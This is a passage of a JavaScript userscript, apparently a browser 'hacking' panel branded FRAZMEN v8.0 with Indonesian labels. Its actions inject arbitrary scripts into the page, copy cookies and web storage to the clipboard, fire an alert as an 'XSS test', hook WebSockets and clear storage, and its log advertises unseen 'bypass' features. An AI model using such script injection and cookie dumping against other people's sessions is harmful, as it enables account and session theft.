                    // Preserve folder structure
                    var parts = path.split('/');
                    var fileName = parts.pop() || 'file';
                    var folder = parts.join('/');
                    var fullPath = folder ? folder + '/' + fileName : fileName;
                    resources[fullPath] = '/* Source: ' + src + ' */\n/* Download via network tab or save as */';
                }
            }

            // Also include all inline styles and scripts
            var inlineStyles = document.querySelectorAll('style');
            for(var i=0; i<inlineStyles.length; i++) {
                var content = inlineStyles[i].textContent;
                if(content && content.trim()) {
                    resources['inline_style_' + (i+1) + '.css'] = content;
                }
            }

            var inlineScripts = document.querySelectorAll('script:not([src])');
            for(var i=0; i<inlineScripts.length; i++) {
                var content = inlineScripts[i].textContent;
                if(content && content.trim()) {
                    resources['inline_script_' + (i+1) + '.js'] = content;
                }
            }

            // README
            resources['README.txt'] = 'Source: ' + location.href + '\nDate: ' + new Date().toISOString() + '\nTotal: ' + Object.keys(resources).length + ' files\n\nFolder structure preserved.';

            // Generate HTML manifest
            var html = '<html><head><title>📦 Full Source Download</title>';
            html += '<style>body{background:#0a0a0a;color:#dce3ed;font-family:sans-serif;padding:20px;max-width:900px;margin:0 auto;}</style>';
            html += '</head><body>';
            html += '<h1>📦 Full Source Download</h1>';
            html += '<p>Total <b>' + Object.keys(resources).length + '</b> files detected.</p>';
            html += '<p>Folder structure preserved as detected.</p>';
            html += '<ul style="list-style:none;padding:0;">';
            var sortedKeys = Object.keys(resources).sort();
            for(var k=0; k<sortedKeys.length; k++) {
                var key = sortedKeys[k];
                var parts = key.split('/');
                var indent = (parts.length - 1) * 20;
                var icon = '📄';
                if(key.endsWith('.js')) icon = '📜';
                else if(key.endsWith('.css')) icon = '🎨';
                else if(key.endsWith('.html') || key.endsWith('.htm')) icon = '🌐';
                else if(key.endsWith('.png') || key.endsWith('.jpg') || key.endsWith('.jpeg') || key.endsWith('.gif') || key.endsWith('.svg') || key.endsWith('.webp')) icon = '🖼️';
                else if(key.endsWith('.json')) icon = '📊';
                else if(key.endsWith('.xml')) icon = '📋';
                else if(key.endsWith('.txt')) icon = '📝';
                html += '<li style="padding:4px 0;border-bottom:1px solid #2e3440;padding-left:' + indent + 'px;">' + icon + ' <b style="word-break:break-all;">' + Utils.escapeHTML(key) + '</b> <span style="color:#6a7385;font-size:10px;">(' + (resources[key].length || 0) + ' bytes)</span></li>';
            }
            html += '</ul>';
            html += '<p style="margin-top:20px;">📥 Download file ini sebagai manifest.</p>';
            html += '<button onclick="location.reload()" style="padding:10px 20px;background:#00cc88;border:none;border-radius:8px;color:#000;font-weight:700;cursor:pointer;">Refresh</button>';
            html += '</body></html>';

            Utils.download(html, 'source_manifest_' + location.hostname + '.html', 'text/html');
            Toast.show('📦 Manifest downloaded! ' + Object.keys(resources).length + ' files', 'success');
            this.addLog('📦 Downloaded ' + Object.keys(resources).length + ' files', 'success');
        },

        _actionViewSource: function() {
            var html = document.documentElement.outerHTML;
            var w = window.open('', '_blank', 'width=800,height=600');
            if(w) {
                w.document.write('<pre style="font-size:11px;font-family:monospace;white-space:pre-wrap;padding:16px;background:#0a0a0a;color:#dce3ed;word-break:break-all;">' + Utils.escapeHTML(html) + '</pre>');
                w.document.close();
            } else {
                Toast.show('Izinkan popup untuk melihat source.', 'warning');
            }
        },

        _actionInject: function() {
            var code = prompt('💉 Masukkan JavaScript:', 'console.log("Hello FRAZMEN!");');
            if(code) {
                try {
                    var s = document.createElement('script');
                    s.textContent = code;
                    document.head.appendChild(s);
                    Toast.show('✅ Script injected!', 'success');
                    this.addLog('💉 Script injected: ' + code.substring(0, 50), 'hack');
                } catch(e) {
                    Toast.show('❌ Gagal: ' + e.message, 'error');
                }
            }
        },

        _actionCookies: function() {
            var cookies = Utils.getCookies();
            var str = Object.keys(cookies).map(function(k) { return k + '=' + cookies[k]; }).join(';\n');
            if(str) {
                Utils.copyToClipboard(str).then(function() { Toast.show('🍪 Cookies disalin!', 'success'); });
                this.addLog('🍪 Cookies: ' + Object.keys(cookies).length + ' cookies', 'hack');
            } else {
                Toast.show('🍪 Tidak ada cookie.', 'warning');
            }
        },

        _actionLSDump: function() {
            var data = Utils.getLocalStorage();
            var str = Object.keys(data).map(function(k) { return k + ' : ' + (typeof data[k] === 'object' ? JSON.stringify(data[k]) : data[k]); }).join('\n');
            if(str) {
                Utils.copyToClipboard(str).then(function() { Toast.show('🗄️ localStorage disalin!', 'success'); });
                this.addLog('🗄️ localStorage: ' + Object.keys(data).length + ' items', 'db');
            } else {
                Toast.show('🗄️ localStorage kosong.', 'warning');
            }
        },

        _actionSSDump: function() {
            var data = Utils.getSessionStorage();
            var str = Object.keys(data).map(function(k) { return k + ' : ' + (typeof data[k] === 'object' ? JSON.stringify(data[k]) : data[k]); }).join('\n');
            if(str) {
                Utils.copyToClipboard(str).then(function() { Toast.show('📋 sessionStorage disalin!', 'success'); });
                this.addLog('📋 sessionStorage: ' + Object.keys(data).length + ' items', 'db');
            } else {
                Toast.show('📋 sessionStorage kosong.', 'warning');
            }
        },

        _actionXSS: function() {
            alert('⚡ XSS Test: ' + document.domain);
            alert('🔥 XSS Triggered!');
            Toast.show('⚡ XSS Test executed!', 'hack');
            this.addLog('⚡ XSS Test executed on ' + document.domain, 'hack');
        },

        _actionAutoFill: function() {
            var inputs = document.querySelectorAll('input, textarea, select');
            var filled = 0;
            inputs.forEach(function(el) {
                var type = el.type || el.tagName;
                if(type === 'text' || type === 'email' || type === 'password' || type === 'search' || type === 'tel' || type === 'textarea') {
                    el.value = 'test_' + Math.random().toString(36).slice(2, 8);
                    filled++;
                } else if(type === 'checkbox' || type === 'radio') {
                    el.checked = true;
                    filled++;
                } else if(el.tagName === 'SELECT' && el.options.length > 0) {
                    el.selectedIndex = Math.floor(Math.random() * el.options.length);
                    filled++;
                } else if(type === 'number') {
                    el.value = Math.floor(Math.random() * 100) + 1;
                    filled++;
                } else if(type === 'date') {
                    var d = new Date();
                    d.setDate(d.getDate() + Math.floor(Math.random() * 30));
                    el.value = d.toISOString().split('T')[0];
                    filled++;
                }
            });
            Toast.show('✏️ ' + filled + ' field terisi!', 'success');
        },

        _actionDarkMode: function() {
            var current = document.body.style.filter;
            if(current === 'invert(1)') {
                document.body.style.filter = 'invert(0)';
                document.body.style.background = '';
            } else {
                document.body.style.filter = 'invert(1)';
                document.body.style.background = '#fff';
            }
            Toast.show('🌙 Dark mode toggled!', 'info');
        },

        _actionNetwork: function() {
            Toast.show('🌐 Buka DevTools -> tab Network', 'info');
        },

        _actionScreenshot: function() {
            Toast.show('📸 Screenshot: Volume Down+Power / Print Screen', 'info');
        },

        _actionEruda: function() {
            if(window.eruda) {
                window.eruda.init();
                Toast.show('🐞 Eruda loaded!', 'success');
                return;
            }
            var s = document.createElement('script');
            s.src = 'https://cdn.jsdelivr.net/npm/eruda';
            s.onload = function() { if(window.eruda) { eruda.init(); Toast.show('🐞 Eruda loaded!', 'success'); } };
            s.onerror = function() { Toast.show('❌ Gagal load Eruda', 'error'); };
            document.head.appendChild(s);
        },

        _actionVConsole: function() {
            if(window.VConsole) {
                new VConsole();
                Toast.show('📱 vConsole loaded!', 'success');
                return;
            }
            var s = document.createElement('script');
            s.src = 'https://cdn.jsdelivr.net/npm/vconsole';
            s.onload = function() { if(window.VConsole) { new VConsole(); Toast.show('📱 vConsole loaded!', 'success'); } };
            s.onerror = function() { Toast.show('❌ Gagal load vConsole', 'error'); };
            document.head.appendChild(s);
        },

        _actionClear: function() {
            localStorage.clear();
            sessionStorage.clear();
            Toast.show('🧹 All storage cleared!', 'success');
            this.addLog('🧹 All storage cleared', 'info');
        },

        _actionPing: function() {
            var start = Date.now();
            fetch(window.location.href, { mode: 'no-cors', cache: 'no-store' })
                .then(function() {
                    var ms = Date.now() - start;
                    Toast.show('📶 Ping: ' + ms + 'ms', 'info');
                })
                .catch(function() {
                    Toast.show('📶 Ping: timeout', 'error');
                });
        },

        _actionWhois: function() {
            var domain = prompt('🔍 Masukkan domain:', window.location.hostname);
            if(domain) {
                Toast.show('🔍 Whois untuk ' + domain + ' — buka tab baru', 'info');
                window.open('https://who.is/whois/' + domain, '_blank');
            }
        },

        _actionBase64: function() {
            var choice = confirm('🔐 Encode? (OK=Encode, Cancel=Decode)');
            var input = prompt('Masukkan teks:');
            if(input !== null && input !== '') {
                try {
                    var result = choice ? btoa(input) : atob(input);
                    Utils.copyToClipboard(result).then(function() { Toast.show('🔐 Hasil disalin!', 'success'); });
                } catch(e) {
                    Toast.show('❌ Error: ' + e.message, 'error');
                }
            }
        },

        _actionUUID: function() {
            var uuid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
                return v.toString(16);
            });
            Utils.copyToClipboard(uuid).then(function() { Toast.show('🆔 UUID disalin!', 'success'); });
        },

        _actionTimestamp: function() {
            var now = Date.now();
            Utils.copyToClipboard(String(now)).then(function() { Toast.show('⏰ Timestamp disalin!', 'success'); });
        },

        _actionWebSocket: function() {
            var origWS = window.WebSocket;
            window.WebSocket = function(url, protocols) {
                var ws = new origWS(url, protocols);
                var id = Utils.generateID('ws_');
                Toast.show('📡 WebSocket connected: ' + url, 'info');
                ws.addEventListener('message', function(e) {
                    var msg = typeof e.data === 'string' ? e.data.substring(0, 100) : '[Binary]';
                    Toast.show('📡 WS: ' + msg, 'info');
                    this.addLog('📡 WS Message: ' + msg, 'debug');
                }.bind(this));
                return ws;
            }.bind(this);
            Toast.show('📡 WebSocket Monitor active!', 'success');
        },

        _actionHistory: function() {
            var history = STATE.consoleHistory || [];
            if(!history.length) {
                Toast.show('📝 Belum ada riwayat console.', 'warning');
                return;
            }
            var output = '📝 Console History:\n\n';
            for(var i=0; i<Math.min(history.length, 50); i++) {
                output += (i+1) + '. ' + history[i] + '\n';
            }
            if(history.length > 50) output += '\n... dan ' + (history.length - 50) + ' lainnya.';
            Utils.copyToClipboard(output).then(function() { Toast.show('📝 Riwayat disalin!', 'success'); });
        },

        _actionReload: function() {
            location.reload();
        },

        _bindEvents: function() {
            // Console capture
            var origLog = console.log;
            console.log = function() {
                var args = Array.from(arguments);
                STATE.consoleHistory.push(args.map(function(a) {
                    return typeof a === 'object' ? JSON.stringify(a) : String(a);
                }).join(' '));
                if(STATE.consoleHistory.length > 1000) STATE.consoleHistory.shift();
                origLog.apply(console, arguments);
            };

            // Keyboard shortcuts
            document.addEventListener('keydown', function(e) {
                if(e.ctrlKey && e.key === 'b') {
                    e.preventDefault();
                    this._triggerAction('bypass');
                }
                if(e.ctrlKey && e.key === 'e') {
                    e.preventDefault();
                    this._triggerAction('eruda');
                }
                if(e.ctrlKey && e.key === 'v') {
                    e.preventDefault();
                    this._triggerAction('vconsole');
                }
                if(e.key === 'F12') {
                    // Default F12 - keep it
                }
            }.bind(this));

            Utils.log('Events bound');
        }
    };

    // ============================================================
    // 9. INIT
    // ============================================================
    function init() {
        Utils.log('═══════════════════════════════════════════════');
        Utils.log('⚡ FRAZMEN v' + CONFIG.version + ' ULTIMATE EDITION');
        Utils.log('Developer: ' + CONFIG.developer);
        Utils.log('Telegram: ' + CONFIG.telegram);
        Utils.log('═══════════════════════════════════════════════');

        // Detect database first
        var db = Utils.detectDatabase();
        if(db.found) {
            Utils.log('🗄️ Database detected: ' + db.type + ' - ' + db.message, 'db');
        }

        ThemeEngine.init();
        Toast.init();
        Panel.init();

        window.FRAZMEN = {
            version: CONFIG.version,
            config: CONFIG,
            state: STATE,
            utils: Utils,
            theme: ThemeEngine,
            storage: StorageManager,
            toast: Toast,
            panel: Panel,
            detectDatabase: Utils.detectDatabase
        };

        Utils.log('FRAZMEN v' + CONFIG.version + ' loaded!');
        Utils.log('Total features: ' + Panel._items.length);
        Toast.show('⚡ FRAZMEN v' + CONFIG.version + ' loaded!', 'success');
    }

    // ============================================================
    // 10. BOOTSTRAP
    // ============================================================
    if(document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        setTimeout(init, 0);
    }

    console.log('⚡ FRAZMEN v8.0 ULTIMATE EDITION');
    console.log('📦 Total features: ' + (Panel._items ? Panel._items.length : 0));
    console.log('👤 Developer: FRAZMEN');
    console.log('📱 Telegram: @rizkycuyy');
    console.log('🔓 25 Bypass versions including database bypass!');
    console.log('💡 Klik tombol ⚡ di kanan bawah untuk membuka menu.');

    // Auto open after load
    setTimeout(function() {
        if(Panel && Panel.show) {
            Panel.show();
            Toast.show('⚡ FRAZMEN siap digunakan!', 'success');
        }
    }, 500);

})();
